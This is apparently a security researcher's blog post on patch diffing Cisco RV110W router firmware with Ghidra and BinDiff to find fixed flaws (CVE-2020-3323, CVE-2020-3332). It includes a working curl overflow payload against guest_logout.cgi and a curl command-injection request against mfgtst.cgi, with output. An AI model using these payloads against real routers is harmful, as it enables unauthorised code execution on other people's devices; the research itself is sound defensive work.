---
layout: post
title:  "Patch Diffing a Cisco RV110W Firmware Update (Part II)"
date:   2020-10-01 12:00:00
author: qkaiser
image: /assets/rv110_bindiff_matched_funcs.png
comments: true
categories: exploitdev
excerpt: |
    This is the second part of a two part blog series on patch diffing Cisco RV firmware where I try to identify fixed flaws (namely CVE-2020-3323, CVE-2020-3330, and CVE-2020-3332). In the first part we identified the static credentials present in Cisco RV110 firmware up to version 1.2.2.5 included.

    In this post, we will perform more serious patch diffing to identify memory corruption and command injection issues in order to provide reduced test cases that can be used to develop a fully working exploit.
   
---

This is the second part of a two part blog series on patch diffing Cisco RV firmware where I try to identify fixed flaws (namely CVE-2020-3323, CVE-2020-3330, and CVE-2020-3332). In the [first part]({{site.url}}/exploitdev/2020/09/23/ghetto-patch-diffing-cisco/) we identified the static credentials present in Cisco RV110 firmware up to version 1.2.2.5 included.

In this post, we will perform more serious patch diffing to identify memory corruption and command injection issues in order to provide reduced test cases that can be used to develop a fully working exploit.


### Initial Setup 

#### Firmware Unpacking

First, download firmware packages from Cisco Download Center. RV130W firmware images will be used for cross-validation.

- [Cisco RV110W Release 1.2.2.8](https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.8)
- [Cisco RV110W Release 1.2.2.5](https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.5)
- [Cisco RV130W Release 1.0.3.54](https://software.cisco.com/download/home/285026141/type/282465789/release/1.0.3.54)
- [Cisco RV130W Release 1.0.3.52](https://software.cisco.com/download/home/285026141/type/282465789/release/1.0.3.52)

You can then unpack each firmware image with binwalk:

{% highlight sh %}
binwalk RV110W_FW_1.2.2.5.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
32            0x20            TRX firmware header, little endian, image size: 10715136 bytes, CRC32: 0x6320519F, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x173BA4, rootfs offset: 0x0
60            0x3C            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 4299308 bytes
1522628       0x173BC4        Squashfs filesystem, little endian, non-standard signature, version 3.0, size: 9188808 bytes, 1074 inodes, blocksize: 65536 bytes, created: 2019-07-24 08:12:22
{% endhighlight %}

The binary we're interested in will be located in \_FIRMWARE_NAME/squashfs-root/usr/sbin/httdp.


#### Binary Diffing with Ghidra

I start by creating a Ghidra project named 'RV110' and create two subdirectories named after the firmware revision numbers.

{:.foo}
![rv110_ghidra_project]({{site.url}}/assets/rv110_ghidra_project.png)

I then import the _httpd_ binary from each firmware root filesystem in its specific directory. One important thing to do is to provide the library search path so that Ghidra can also load the system libraries the binary is dynamically linked with.

To do so, click on 'Options' then enable 'Load external libraries' and click on 'Edit paths'. You should provide two paths from the firmware rootfs: _/lib_ and _/usr/lib_.

{:.foo}
![ghidra_load_rv110_httpd.png]({{site.url}}/assets/ghidra_load_rv110_httpd.png)

When each file is loaded into the project, double click on them and perform auto analysis. When the analysis is done, save the file and get back to the main window.

Now that our binaries have been analyzed by Ghidra, we can launch a version tracking session. Name the session to your liking and set both versions of _httpd_ as source and destination programs:

{:.foo}
![rv110_ghidra_version_tracking]({{site.url}}/assets/rv110_ghidra_version_tracking.png)

I won't go into the finer details of Ghidra version tracking tool, but I recommend you read this excellent post by threatrack: [Patch Diffing with Ghidra - Using Version Tracking to Diff a LibPNG Update](https://blog.threatrack.de/2019/10/02/ghidra-patch-diff/).

Once loaded, click on the magic wand button to execute "Automatic Version Tracking". Wait for all the correlators to run and then click on the filter button on the bottom right. This will load the following window:

{:.foo}
![ghidra_vt_match_table_filters]({{site.url}}/assets/ghidra_vt_match_table_filters.png)

I had the best results identifying patched functions with these exact filters. The version tracking table should list two functions:

{:.foo}
![rv110_vt_filter_results]({{site.url}}/assets/rv110_vt_filter_results.png)

The first one (FUN_0040c400) seems to be a good candidate for memory corruption issue (either CVE-2020-3323 or CVE-2020-3331). Precisely 8 calls to _strcpy_ were changed to _strncpy_ in this exact function. This function handles form submission from the setup wizard that can be launched on the web management interface to execute the device's first configuration (WAN interface, DNS, NTP, DHCP ranges, etc). When identifying dangerous calls, I always bookmark them (Ctrl-D in Ghidra) to find
them back faster.

{:.foo}
![rv110_vt_patch_memcorrupt]({{site.url}}/assets/rv110_vt_patch_memcorrupt.png)


The second one (FUN_0041d0b0) is a patch for the information disclosure issue I reported (CVE-2020-3150):

{:.foo}
![rv110_check_cfg_patch.png]({{site.url}}/assets/rv110_check_cfg_patch.png)


At this point I pretty much hit the limit of what Ghidra version tracking can do for patch diffing and I still had to identify another memory corruption vulnerability (either CVE-2020-3323 or CVE-2020-3331), so I switched to Bindiff.

**Update** It turned out these insecure calls were not linked to these CVEs and just happen to be cleanup performed by Cisco development team. Keep on reading to learn about the actual code responsible for these CVEs :)

#### Patch Diffing with Bindiff

Performing binary diffing with Bindiff requires the ability to export analyzed binaries to BinExport format. The BinExport project provides a Ghidra plugin to do so but you need to assemble the jar file yourself. This [excellent guide](https://ihack4falafel.github.io/Patch-Diffing-with-Ghidra/) by Hashim Jawad will guide you through the installation steps.

I had GLIBC version issues with the latest version of Bindiff so if you encounter the same problem, just use version 5 instead of version 6.

First thing first, let's export our analyzed httpd binaries to Bindiff format. Right click on the file, then click on 'Export'.

{:.foo}
![rv110_export_to_bindiff]({{site.url}}/assets/rv110_export_to_bindiff.png)

Select 'Binary BinExport (v2) for BinDiff' as format and set your output filename:

{:.foo}
![rv110_export_to_bindiff_2]({{site.url}}/assets/rv110_export_to_bindiff_2.png)

Repeat the operation for both file and launch BinDiff (`bindiff -ui` on Linux).

Create a new workspace ('File' -> 'New Workspace') and create a new diff within that workspace ('Diffs' -> 'New Diffs...'):

{:.foo}
![rv110_bindiff_newdiff]({{site.url}}/assets/rv110_bindiff_newdiff.png)

BinDiff will present you with a nice table of matched functions, order them by similarity ratio to get the one that differs the most first:

{:.foo}
![rv110_bindiff_matched_funcs]({{site.url}}/assets/rv110_bindiff_matched_funcs.png)


After a while, I had bookmarked all interesting code sections in Ghidra. A lot of insecure calls have been cleaned up by the development team, even if not exploitable per se.

{:.foo}
![rv110_ghidra_bookmarks]({{site.url}}/assets/rv110_ghidra_bookmarks.png)

I'll go over each CVE in the next sections.

### Finding CVE-2020-3323

CVE-2020-3323 is described as "_A vulnerability in the web-based management interface of Cisco Small Business **RV110W, RV130, RV130W, and RV215W Routers** could allow an **unauthenticated, remote attacker to execute arbitrary code** on an affected device._".

At first I thought this memory corruption was linked to insecure calls to strcpy that were fixed between revision 1.2.2.5 and 1.2.2.8, but it did not make sense as these calls were unreachable from an unauthenticated context. After a while, I finally identified what triggered the memory corruption: an insecure call to _sscanf_ in the _guest_logout_cgi_ function.

The function is quite large but the pseudo-code below should give you the gist of it:

{% highlight c %}

char acStack172 [64];
char acStack108 [68];

char* cip = get_cgi("cip");
char* cmac = get_cgi("cmac");
char* submit_button = get_cgi("submit_button");

int v = strstr(submit_button,"status_guestnet.asp");
if(v != NULL){
    // they're looking for status_guestnet.asp;session_id=current_user_session_id_value
    sscanf(submit_button,"%[^;];%*[^=]=%[^\n]",acStack108,acStack172);
}
{% endhighlight %}

The _submit_button_ value is user controlled and given that size is not explicitly provided, we can overflow acStack108 or acStack172. The curl command below is a reduced crash case that will overwrite the return address with 0x42424242 (BBBB).

{% highlight curl %}
curl -ki -X POST https://192.168.1.43/guest_logout.cgi -d"cmac=00:01:02:03:04:05"\
-d "ip=192.168.1.1"\
-d "submit_button=status_guestnet.aspAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"
{% endhighlight %}

<!-- TODO: update metasploit payloads ? -->

Here's the function offsets for reference:

| **Model** | **Firmware**  | **Offset**    |
|:----------|:-------------:|--------------:|
| RV110     | 1.2.2.5       | 0x004317f8    |
| RV130     | 1.0.3.52      | 0x0002b170    |
| RV215     | 1.3.1.5       | 0x0043441c    |

### Finding CVE-2020-3332

CVE-2020-3332 is described as "_A vulnerability in the web-based management interface of **Cisco Small Business RV110W, RV130, RV130W, and RV215W Series Routers** could allow an **authenticated, remote attacker to inject arbitrary shell commands that are executed by an affected device**._".

I identified (now patched) command injections in these functions:

| **Function**      | **Offset** (firmware version 1.2.2.5)    |
|:----------------|--------------:|
| IperfServerCmd  | 0x004141e8    |
| IperfClientCmd  | 0x00414e58    |
| SetWLChCmd      | 0x00415f2c    |
| SetWLSSIDCmd    | 0x00416974    |

Each of these functions follows the same insecure procedure:

1. Read query parameter with _get_cgi_
2. Build a command line using obtained query parameter
3. Call _system_

{:.foo}
![rv110_command_injection]({{site.url}}/assets/rv110_command_injection.png)

I still don't fully understand how these functions can be called from the web interface. They seem to be called by an undocumented CGI script named _mfgtst.cgi_. I found some [obscure reference](https://www.securityfocus.com/archive/1/541369) to it on the Internet, mentioning that simply _calling_ the CGI script would trigger a denial of service on some old Linksys device. The script itself looks like a diagnostic tool that will check wireless settings, USB settings, and performances.

#### Update - October 5th 2020

I finally identified how these CGIs calls can be triggered. The curl command below will inject the command `ping -c 3 10.10.10.100` into a system call by using double pipes.

{% highlight curl %}
curl -ki -X POST 'https://192.168.1.43/mfgtst.cgi?sys_iperfServer=1&sys_iperfWinSize=1
&sys_iperfPort=80%7C%7Cping%20-c%203%2010.10.10.100%7C%7C&sys_iperfMode=-u
;session_id=0d00538ca990439d194ff8b294927e08'
HTTP/1.1 200 Ok
Server: httpd
Date: Mon, 05 Oct 2020 10:31:09 GMT
Cache-Control: no-cache
Pragma: no-cache
Expires: 0
Content-Type: text/plain
Connection: close

HTTP/1.1 200 Ok
Server: httpd
Date: Mon, 05 Oct 2020 10:31:16 GMT
Content-Type: text/plain
Connection: close
{% endhighlight %}

Note that the call must be authenticated and that a specific NVRAM value (`mfg_radio`) must be set to "on" manually for the injection to work. 

## Conclusion

I learned a lot of things over the course of this patch diffing session. I'm now able to navigate and understand both Ghidra version tracker and BinDiff user interfaces. I identified blind spots in my review process, such as the fact I never looked for calls to _sscanf_ in the past.

This exercise gave me a lot to think about, especially on the subject of automation. It would be great to have static and dynamic analyzers for embedded device binaries that can not only identify insecure C calls, but can filter the noise to only show the ones that are most likely to be exploitable. A lot of calls to _system_ in these firmwares are using fixed strings for example, and we're not interested in those.

I have had interesting results using Radare2 and Unicorn engine and I'll most likely publish something in the coming months. The idea is to identify functions in the binary that calls system() using r2. Then we fully emulate the function using Unicorn Engine while hooking _system_ and _get\_cgi_. The _get\_cgi_ hook would return a tainted value, while the _system_ hook would proceed by checking if the system call parameter contains our tainted value in an insecure way (i.e. unquoted).

There's a lot to do, but I think I know how to move forward ! As always, if you have any question just get in touch on [Twitter](https://twitter.com/qkaiser) or by [email](mailto:kaiserquentin@gmail.com) :)
